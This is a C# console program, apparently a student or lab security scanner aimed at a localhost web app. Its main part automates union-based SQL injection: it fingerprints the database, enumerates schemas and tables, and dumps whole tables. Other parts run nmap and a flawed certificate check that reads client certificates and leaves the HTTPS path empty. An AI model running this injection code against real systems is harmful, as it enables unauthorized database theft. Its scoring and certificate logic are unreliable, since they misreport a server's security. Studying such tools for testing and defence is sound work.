using System.Net;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace Vizsgalo
{
    public class Scanner
    {
        private static string _baseResponse = ""; // this is the base response which makes the base query (for comparing with the injected results later)
        
        private static readonly string AsterisksSeparator = new string('*', Console.WindowWidth);
        private const string UnionStart = "'' OR 1=1 UNION SELECT ";
        private static int _unionNumber; // it represents how many plus columns we need to write in the union selects
        private static string _unionColumnsString = ""; // it represents the union columns (the default value is "" aka no extra column)
        private static string _db = "";
        private static string _dbVersion = "";
        private const string IsSqlServerOrMySql = "@@version;--";
        private const string IsSqlite = "sqlite_version();--";

        private static HttpClient _httpClient = new()
        {
            BaseAddress = new Uri("http://localhost:5227/Users")
        };

        public static async Task Main()
        {
            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, "Examination started\n");
            
            await StartExamination(_httpClient);
            
            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, "Examination finished");
        }
        
        // sends a GET request to the given url and writes the responses to the console
        static async Task StartExamination(HttpClient httpClient)
        {
            SetEndpoint(httpClient);
            string[] parameters = GetQueryParameters();
            string firstParameter = parameters[0];

            await GetBaseResponse(httpClient, firstParameter);

            await SetupUnionAndDatabase(httpClient, firstParameter);

            InfoColors.WriteToConsole(InfoColors.ResponseResultText, 
                "\nSuccess, " + _db + " is used, database version: " + _dbVersion);
            Console.WriteLine();
            InfoColors.WriteToConsole(InfoColors.SummaryText, 
                "Number of extra columns: " + _unionNumber + ", the union section of the query string: " + _unionColumnsString);

            // execute the commands given by the user (the options are specified below)
            ConsoleKeyInfo key;
            do
            {
                PrintCommandList();
                key = Console.ReadKey();
                Console.WriteLine();

                switch (key.Key)
                {
                    // OPTION 1: get all schema names in the current database
                    case ConsoleKey.D1:
                        await HandleAllSchemas(httpClient, firstParameter);
                        break;

                    // OPTION 2: get all table names in the given schema
                    case ConsoleKey.D2:
                        await HandleTablesInSchema(httpClient, firstParameter);
                        break;

                    // OPTION 3: get the given table's schema
                    case ConsoleKey.D3:
                        await HandleTableSchemas(httpClient, firstParameter);
                        break;

                    // OPTION 4: get all data from a specific database column
                    case ConsoleKey.D4:
                        await HandleDataFromColumn(httpClient, firstParameter);
                        break;

                    // OPTION 5: get all data from the given database
                    case ConsoleKey.D5:
                        await HandleAllDataFromTable(httpClient, firstParameter);
                        break;

                    // OPTION 6: scan for open ports
                    case ConsoleKey.D6:
                        HandlePortScanning();
                        break;

                    // OPTION 7: check the validity of the server's certificate
                    case ConsoleKey.D7:
                        HandleCertificateCheck(httpClient);
                        break;

                    // OPTION 8: change target endpoint
                    /*case ConsoleKey.D8:
                        SetEndpoint(httpClient);
                        break;*/

                    // OPTION 9: run a full analysis and calculate a score
                    case ConsoleKey.D9:
                        await HandleFullAnalysis(httpClient, firstParameter);
                        break;
                }
            } while (key.Key != ConsoleKey.D0); // if the 0 button is pressed then the examination finishes
        }
        
        /* ----------------------------------------- Key event handlers --------------------------------------------- */
        static async Task HandleAllSchemas(HttpClient httpClient, string firstParameter)
        {
            InfoColors.WriteToConsole(InfoColors.ResponseCategory,
                "\nAll schemas in the current database:");
            string response = await GetAllSchemaNames(httpClient, firstParameter);
            InfoColors.WriteToConsole(InfoColors.ResponseResultText, response);
        }

        static async Task HandleTablesInSchema(HttpClient httpClient, string firstParameter)
        {
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "\nEnter the name of the schema:");
            string schemaName = Console.ReadLine() ?? "";
            Console.WriteLine();
            if (schemaName != "")
            {
                InfoColors.WriteToConsole(InfoColors.ResponseCategory,
                    "\nAll tables in the given database:");
                string response = await GetTableNamesInSchema(httpClient, schemaName, firstParameter);
                InfoColors.WriteToConsole(InfoColors.ResponseResultText, response);
            }
        }

        static async Task HandleTableSchemas(HttpClient httpClient, string firstParameter)
        {
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "\nEnter the name of the table:");
            string tableName = Console.ReadLine() ?? "";
            Console.WriteLine();
            if (tableName != "")
            {
                InfoColors.WriteToConsole(InfoColors.ResponseCategory,
                    "\nThe given table's schema:");
                string response = await GetTableColumns(httpClient, tableName, firstParameter);
                InfoColors.WriteToConsole(InfoColors.ResponseResultText, response);
            }
        }

        static async Task HandleDataFromColumn(HttpClient httpClient, string firstParameter)
        {
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "\nEnter the name of the table:");
            string tableName = Console.ReadLine() ?? "";
            Console.WriteLine();
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "\nEnter the name of the column:");
            string columnName = Console.ReadLine() ?? "";
            Console.WriteLine();
            if (tableName != "" && columnName != "")
            {
                InfoColors.WriteToConsole(InfoColors.ResponseCategory,
                    "\nGetting all data from table " + tableName + " from column " + columnName);
                string response = await GetDataFromTableColumn(httpClient, tableName, columnName, firstParameter);
                InfoColors.WriteToConsole(InfoColors.ResponseResultText, response);
            }
        }

        static async Task HandleAllDataFromTable(HttpClient httpClient, string firstParameter)
        {
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "\nEnter the name of the database:");
            string tableName = Console.ReadLine() ?? "";
            Console.WriteLine();
            if (tableName != "")
            {
                string data = await GetAllDataFromTable(httpClient, tableName, firstParameter);
                InfoColors.WriteToConsole(InfoColors.ResponseResultText, data);
            }
        }

        static void HandlePortScanning()
        {
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "\nEnter the server's IP address:");
            string address = Console.ReadLine() ?? "";
            
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "\nEnter the nmap arguments:");
            string pars = Console.ReadLine() ?? "";
            string args = pars + " " + address;
            
            Console.WriteLine();
            if (args != " ")
            {
                InfoColors.WriteToConsole(InfoColors.ScanningStartText,
                    "Scanning " + address + " with these parameters: " + pars);
                string result = ScanForOpenPorts(args);
                InfoColors.WriteToConsole(InfoColors.ResponseResultText, result);
                InfoColors.WriteToConsole(InfoColors.SummaryText,
                    "Number of open ports: " + Regex.Matches(result, "open").Count);
            }
            else
            {
                InfoColors.WriteToConsole(InfoColors.StatusError,"Invalid parameters!");
            }
        }

        static string HandleCertificateCheck(HttpClient httpClient, bool writeResultToConsole = true)
        {
            string address = httpClient.BaseAddress != null
                ? httpClient.BaseAddress.ToString()
                : "localhost";
            string result = "";
            if (address.Contains("http"))
            {
                result = CheckCertificateHttp(address);
            }
            else if (address.Contains("https"))
            {
                result = CheckCertificateHttps(address);
            }
            else
            {
                string httpAddress = "http://" + address;
                result = CheckCertificateHttp(httpAddress);
            }

            if (writeResultToConsole)
            {
                InfoColors.WriteToConsole(InfoColors.ResponseResultText, result);
            }
            
            return result;
        }

        static async Task HandleFullAnalysis(HttpClient httpClient, string firstParameter)
        {
            InfoColors.WriteToConsole(InfoColors.ResponseCategory,
                "\nRunning full analysis on the target site...");
            await RunFullAnalysis(httpClient, firstParameter);
        }
        /* ---------------------------------------------------------------------------------------------------------- */
        

        // sets the endpoint given by the user
        static void SetEndpoint(HttpClient httpClient)
        {
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "Enter the endpoint of the target URL (e.g. /Sqlserver/");
            string endPoint = Console.ReadLine() ?? "/Sqlserver/";
            if (endPoint == "")
            {
                endPoint = "/Sqlserver/";
            }
            httpClient.BaseAddress = new Uri(httpClient.BaseAddress + endPoint);
            InfoColors.WriteToConsole(InfoColors.SummaryText,
                "Total base address: " + httpClient.BaseAddress);
        }

        // gets the URL query parameters from the user
        static string[] GetQueryParameters()
        {
            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
                "\nEnter the query string parameters (separated with ; characters):");
            string paramsString = Console.ReadLine() ?? "";
            
            return paramsString.Split(";");
        }

        // gets the base response which is returned to the base injected query (for result filtering)
        static async Task GetBaseResponse(HttpClient httpClient, string firstParameter)
        {
            // gets the base response
            HttpResponseMessage baseResponse = await httpClient.GetAsync("?" + firstParameter + "=" + "'' OR 1=1;--");
            InfoColors.WriteToConsole(InfoColors.ResponseCategory, "\nRequest:");
            InfoColors.WriteToConsole(InfoColors.ResponseResultText, baseResponse.RequestMessage!.ToString());
            var jsonBaseResponse = await baseResponse.Content.ReadAsStringAsync();
            _baseResponse = jsonBaseResponse;
        }

        // determines the number of union columns and that which database is used
        static async Task SetupUnionAndDatabase(HttpClient httpClient, string firstParameter)
        {
            HttpResponseMessage unionResponse;
            string unionUrlBase = "?" + firstParameter + "=" + UnionStart;
            
            do
            {
                _unionNumber++;
                Console.WriteLine();
                InfoColors.WriteToConsole(InfoColors.ResponseCategory, 
                    _unionNumber + ". attempt: trying the union select with " + _unionNumber + " column(s)...");
                Console.WriteLine();
                
                InfoColors.WriteToConsole(InfoColors.ResponseResultText, 
                    "Checking for SQL Server or MySql first...");
                _unionColumnsString = _unionColumnsString == "" ? "'1'" : _unionColumnsString + ",'1'";
                string unionSqlServerOrMySql = unionUrlBase + _unionColumnsString + ", " + IsSqlServerOrMySql;
                
                unionResponse = await httpClient.GetAsync(unionSqlServerOrMySql);
                InfoColors.WriteToConsole(InfoColors.ResponseResultText, unionResponse.RequestMessage!.ToString());
                var jsonUnionResponse = await unionResponse.Content.ReadAsStringAsync();
                
                InfoColors.WriteToConsole(unionResponse.StatusCode == HttpStatusCode.OK ? InfoColors.StatusSuccess : InfoColors.StatusError, 
                    "Status code: " + unionResponse.StatusCode);
                if (unionResponse.StatusCode != HttpStatusCode.OK) // if it wasn't SQL Server or MySql then it checks for SQLite
                {
                    InfoColors.WriteToConsole(InfoColors.ResponseResultText, 
                        "Checking for SQLite...");
                    string unionSqlite = unionUrlBase + _unionColumnsString + ", " + IsSqlite;
                    unionResponse = await httpClient.GetAsync(unionSqlite);
                    
                    InfoColors.WriteToConsole(InfoColors.ResponseCategory, "\nRequest:");
                    InfoColors.WriteToConsole(InfoColors.ResponseResultText, unionResponse.RequestMessage!.ToString());
                    
                    jsonUnionResponse = await unionResponse.Content.ReadAsStringAsync();
                    InfoColors.WriteToConsole(unionResponse.StatusCode == HttpStatusCode.OK ? InfoColors.StatusSuccess : InfoColors.StatusError, 
                        "Status code: " + unionResponse.StatusCode);

                    if (unionResponse.StatusCode == HttpStatusCode.OK)
                    {
                        _db = "sqlite";
                        _dbVersion = jsonUnionResponse.Contains("sqlite3") || jsonUnionResponse.Contains("3.4") ? "3.4" : "old-sqlite";
                    }
                }
                // else it checks whether it is SQL Server or MySql
                else 
                {
                    if (jsonUnionResponse.Contains("Microsoft SQL Server"))
                    {
                        _db = "sqlserver";
                        _dbVersion = jsonUnionResponse.Split("Microsoft SQL Server")[1].Split(" - ")[1].Split(")")[0] + ")";
                    }
                    else
                    {
                        _db = "mysql";
                        _dbVersion = jsonUnionResponse.Split("MariaDB")[0] + "MariaDB";
                    }
                }
            } while (unionResponse.StatusCode != HttpStatusCode.OK);
        }

        static void PrintCommandList()
        {
            Console.WriteLine();
            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, 
                AsterisksSeparator + "\nSelect an operation to be executed by the application");
            
            InfoColors.WriteToConsole(InfoColors.Operations1,
                "\nDATABASE OPERATIONS" +
                "\n> Press '1' to get all schema names in the current database" +
                "\n> Press '2' to get all table names in the given schema" +
                "\n> Press '3' to get the given table's schema" +
                "\n> Press '4' to get all data from a specific database column" +
                "\n> Press '5' to get all data from the given database");
                
            InfoColors.WriteToConsole(InfoColors.Operations2,
                "\nNETWORK AND SERVER OPERATIONS" +
                "\n> Press '6' to scan the server for open ports" +
                "\n> Press '7' to check the validity of the server's certificate");
                
            /*Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine("\nCHANGE SETTINGS");
            Console.WriteLine("> Press '8' to change target endpoint");*/
                
            InfoColors.WriteToConsole(InfoColors.Operations3,
                "\nFULL ANALYSIS" +
                "\n> Press '9' to run a full analysis and read results");

            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, 
                "\n> Press '0' to escape (finish) the examination\n" + AsterisksSeparator);
        }

        
        // starts the full automatic analysis
        static async Task RunFullAnalysis(HttpClient httpClient, string firstQueryParameter)
        {
            /*
             Full analysis:
                1. get table names, query the first (get all data) -> sql injection score
                    - if it's not possible to get table schema -> 0.5
                    - if it's possible to get table schema but not the data -> 0.25
                    - if it's possible to get every information -> 0
                2. scan for open ports -> ports score
                    - if the number of open ports is lower or equal than 10 -> 1
                    - else 0
                3. check certificate -> certificate score
                    - if the number of valid certificates is at least 1 -> 1
                    - else 0
                4. score summary
                    prints summaries by processes and a full score:
                    full score = (injection + ports + certificate) / 3
            */

            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, "Starting auto analysis...");

            // PROCESS 1: test sql injection
            double sqlInjectionScore = await AutoTestSqlInjection(httpClient, firstQueryParameter); // it starts from 0.5 if it got here (the app got the db and the union select with SQL injections)

            // PROCESS 2: test open ports
            double portsScore = AutoTestPorts();

            // PROCESS 3: test certificates
            double certificateScore = AutoTestCertificates(httpClient);
            
            
            /* SUMMARIES */
            DisplaySummariesByProcesses(sqlInjectionScore, portsScore, certificateScore);

            double fullScore = (sqlInjectionScore + portsScore + certificateScore) / 3;
            DisplayOverallSummary(fullScore);
        }

        static async Task<double> AutoTestSqlInjection(HttpClient httpClient, string firstQueryParameter)
        {
            // STEP 1: get table schemas
            string schemaNames = await GetAllSchemaNames(httpClient, firstQueryParameter);
            string[] response = schemaNames.Split(" | ");
            if (response.Length > 0)
            {
                // STEP 2: get table names in the first schema
                string tableNames = await GetTableNamesInSchema(httpClient, response[0], firstQueryParameter);
                response = tableNames.Split(" | ");
                if (response.Length > 0)
                {
                    // STEP 3: get all data from the first table
                    string tableData = await GetAllDataFromTable(httpClient, response[0], firstQueryParameter);
                    response = tableData.Split(" | ");
                    if (response.Length > 0)
                    {
                        return 0;
                    }
                    
                    return 0.25;
                }
            }
            
            return 0.5;
        }

        static double AutoTestPorts()
        {
            InfoColors.WriteToConsole(InfoColors.ScanningStartText, "Scanning for open ports...");
            string result = ScanForOpenPorts("");
            
            //InfoColors.WriteToConsole(InfoColors.ResponseResultText, result);
            
            int openPorts = Regex.Matches(result, "open").Count;
            //InfoColors.WriteToConsole(InfoColors.SummaryText, "Number of open ports: " + openPorts);
            
            return openPorts > 10 ? 0 : 1;
        }

        static double AutoTestCertificates(HttpClient httpClient)
        {
            InfoColors.WriteToConsole(InfoColors.ScanningStartText, "Checking server certificates...");
            string result = HandleCertificateCheck(httpClient, false);
            string[] response = result.Split(" | ");
            
            return response.Length == 0 || (response.Length == 1 && !response[0].Contains("Expiration")) ? 0 : 1;
        }

        
        // displays summaries by processes at the end of the automatic analysis
        static void DisplaySummariesByProcesses(double sqlInjectionScore, double portsScore, double certificateScore)
        {
            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, 
                "\nFull analysis finished! Results by categories:");
            
            InfoColors.WriteToConsole(InfoColors.ResponseCategory, 
                "\nSQL injection score:");
            InfoColors.WriteToConsole(InfoColors.ResponseResultText, 
                AreEqual(sqlInjectionScore, 0.5) ?
                    "It was possible to perform an SQL injection, but could not get any data from the database. Medium security." :
                    AreEqual(sqlInjectionScore, 0.25) ?
                        "It was possible to get all database schemas and the tables in them, but could not get any data from the tables. Low security." :
                        "It was possible to retrieve all data from the database. Zero security.");
            
            InfoColors.WriteToConsole(InfoColors.ResponseCategory, 
                "\nPorts score:");
            InfoColors.WriteToConsole(InfoColors.ResponseResultText,
                AreEqual(portsScore, 1.0) ?
                    "The total number of open ports is not higher than 10. Optimal security.":
                    "The total number of open ports is higher than 10. Low security.");
            
            InfoColors.WriteToConsole(InfoColors.ResponseCategory, 
                "\nCertificates score:");
            InfoColors.WriteToConsole(InfoColors.ResponseResultText, 
                AreEqual(certificateScore, 1.0) ?
                    "There is at least 1 valid certificate. Optimal security.":
                    "There are no valid certificates. Zero security.");
        }

        // displays the overall summary at the end of the automatic analysis
        static void DisplayOverallSummary(double fullScore)
        {
            InfoColors.WriteToConsole(InfoColors.SummaryText, 
                "\nOverall score:\n" + Math.Round(fullScore, 2) * 100 + "%");
        }
        
        
        /* INDIVIDUAL TASKS */
        static async Task<string> GetAllSchemaNames(HttpClient httpClient, string firstQueryParameter)
        {
            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", ";
            if (_db == "sqlserver")
            {
                 url += "schema_name(t.schema_id) FROM sys.tables t;--";
            } else if (_db == "mysql")
            {
                url += "schema_name FROM information_schema.schemata;--";
            } else if (_db == "sqlite")
            {
                //TODO
            }
            
            // sends GET request to server
            string[] response = await GetRequest(httpClient, url);
            return string.Join(" | ", response);
        }
        
        static async Task<string> GetTableNamesInSchema(HttpClient httpClient, string schemaName, string firstQueryParameter)
        {
            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", ";
            if (_db == "sqlserver")
            {
                url += "t.name FROM sys.tables t where schema_name(t.schema_id) = '" + schemaName + "';--";
            } else if (_db == "mysql")
            {
                url += "table_name FROM information_schema.tables where table_schema = '" + schemaName + "';--";
            } else if (_db == "sqlite")
            {
                url += "name FROM sqlite_schema where type = 'table';--";
            }
            
            // sends GET request to server
            string[] response = await GetRequest(httpClient, url);
            return string.Join(" | ", response);
        }
        
        static async Task<string> GetTableColumns(HttpClient httpClient, string tableName, string firstQueryParameter)
        {
            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", ";
            if (_db == "sqlserver" || _db == "mysql")
            {
                url += "COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '" + tableName + "';--";
            } else if (_db == "sqlite")
            {
                url += "name FROM pragma_table_info('" + tableName + "');--";
            }
            
            // sends GET request to server
            string[] response = await GetRequest(httpClient, url);
            return string.Join(" | ", response);
        }
        
        static async Task<string> GetDataFromTableColumn(HttpClient httpClient, string tableName, string columnName, string firstQueryParameter)
        { 
            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", " + columnName + " FROM " + tableName + ";--";
            // sends GET request to server
            Console.WriteLine("Getting all data using " + _db + "...");
            string[] response = await GetRequest(httpClient, url);
            return string.Join(" | ", response);
        }
        
        static async Task<string> GetAllDataFromTable(HttpClient httpClient, string tableName, string firstQueryParameter)
        {
            Console.WriteLine("Getting all data using " + _db + "...");
            
            string res = await GetTableColumns(httpClient, tableName, firstQueryParameter);
            string[] columnNames = res.Split(" | ");

            List<string[]> allData = new List<string[]>();
            for (int i = 0; i < columnNames.Length; i++)
            {
                string columnData = await GetDataFromTableColumn(httpClient, tableName, columnNames[i], firstQueryParameter);
                allData.Add(columnData.Split(" | "));
            }

            if (allData.Count == 0)
            {
                return "";
            }
            
            // all columns have the same number of rows
            int rowNum = allData[0].Length + 1;
            string[] formattedRows = new string[rowNum];
            
            // the first row will be the column names
            formattedRows[0] = string.Join("\t", columnNames); 
            
            for (int i = 1; i < rowNum; i++)
            {
                formattedRows[i] = string.Join("\t", allData[i-1]);
            }

            return string.Join("\n", formattedRows);
        }

        static string ScanForOpenPorts(string arguments)
        {
            InfoColors.WriteToConsole(InfoColors.ScanningStartText,"\nScanning in progress...");
            string nmapPath = "C:\\Program Files (x86)\\Nmap\\nmap.exe";
            string result;
            
            using (Process process = new Process())
            {
                process.StartInfo.FileName = nmapPath;
                process.StartInfo.Arguments = arguments;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                using (StreamReader reader = process.StandardOutput)
                {
                    result = reader.ReadToEnd();
                }

                process.WaitForExit();
            }
            
            return result;
        }

        static string CheckCertificateHttp(string address)
        {
            try
            {
                using (HttpClientHandler handler = new HttpClientHandler())
                {
                    using (HttpClient client = new HttpClient(handler))
                    {
                        InfoColors.WriteToConsole(InfoColors.ScanningStartText,
                            "Checking " + address + " for any certificates...");
                        HttpResponseMessage response = client.GetAsync(address).Result;

                        if (response.IsSuccessStatusCode)
                        {
                            // Server certificate information can be accessed here
                            var certificates = handler.ClientCertificates;

                            if(certificates.Count == 0)
                            {
                                return "\nThe server did not provide any certificates.";
                            }

                            InfoColors.WriteToConsole(InfoColors.ResponseCategory,
                                "\nThe server provides these certificates:");
                            List<string> certificatesList = new List<string>();
                            for (int i = 0; i < certificates.Count; i++)
                            {
                                string expirationDate = certificates[i].GetExpirationDateString();

                                string certificateResult =
                                    $"\nCertificate #{i + 1}: {certificates[i]}\nExpiration date: {expirationDate}";
                                certificatesList.Add(certificateResult);
                            }
                            return string.Join(" | ", certificatesList);
                        }

                        InfoColors.WriteToConsole(InfoColors.StatusError, 
                            "HTTP request failed with status code: " + response.StatusCode);
                    }
                }
            }
            catch (Exception ex)
            {
                InfoColors.WriteToConsole(InfoColors.StatusError, 
                    "Error: " + ex.Message);
            }
            return "";
        }
        
        static string CheckCertificateHttps(string address)
        {
            return "";
        }
        
        
        
        static async Task<string[]> GetRequest(HttpClient httpClient, string url)
        {
            using HttpResponseMessage response = await httpClient.GetAsync(url);
            InfoColors.WriteToConsole(InfoColors.ResponseCategory, "\nRequest:");
            InfoColors.WriteToConsole(InfoColors.ResponseResultText, response.RequestMessage!.ToString());
    
            var jsonResponse = await response.Content.ReadAsStringAsync();
            InfoColors.WriteToConsole(InfoColors.ResponseCategory, "\nResponse:");
            string[] filteredResponse = FilterResponse(jsonResponse);
            return filteredResponse;
        }


        static string[] FilterResponse(string fullResponse)
        {
            return FilterTableData(GetMiddleSubstring(_baseResponse, fullResponse));
        }
        
        static string GetMiddleSubstring(string first, string second)
        {
            // finds the common prefix
            int commonPrefixLength = 0;
            while (commonPrefixLength < first.Length && commonPrefixLength < second.Length && first[commonPrefixLength] == second[commonPrefixLength])
            {
                commonPrefixLength++;
            }

            // finds the common suffix
            int commonSuffixLength = 0;
            while (commonSuffixLength < first.Length - commonPrefixLength
                   && commonSuffixLength < second.Length - commonPrefixLength
                   && first[first.Length - commonSuffixLength - 1] == second[second.Length - commonSuffixLength - 1])
            {
                commonSuffixLength++;
            }

            // extracts the middle substring
            int middleStart = commonPrefixLength;
            int middleLength = second.Length - commonPrefixLength - commonSuffixLength;

            if (middleLength > 0)
            {
                return second.Substring(middleStart, middleLength);
            }

            return ""; // If no middle substring found
        }

        static string[] FilterTableData(string rawData)
        {
            if (!rawData.Contains("td"))
            {
                string[] raw = new string[1];
                raw[0] = rawData;
                return raw;
            }

            string[] fields = 
                rawData
                    .Replace("</", String.Empty)
                    .Replace("/>", String.Empty)
                    .Replace("<", String.Empty)
                    .Replace(">", String.Empty)
                    .Replace("tr", String.Empty)
                    .Replace(" ", String.Empty)
                    .Split("td");
            var finalFields = new List<string>();
            for (int i = 0; i < fields.Length; i++)
            {
                if (!string.IsNullOrWhiteSpace(fields[i]) && !fields[i].Equals("1"))
                {
                    finalFields.Add(WebUtility.HtmlDecode(fields[i]));
                }
            }
            return finalFields.ToArray();
        }
        
        // checks equality between two double values
        static bool AreEqual(double var1, double var2, double tolerance = 0.0001)
        {
            return Math.Abs(var1 - var2) < tolerance;
        }
    }
}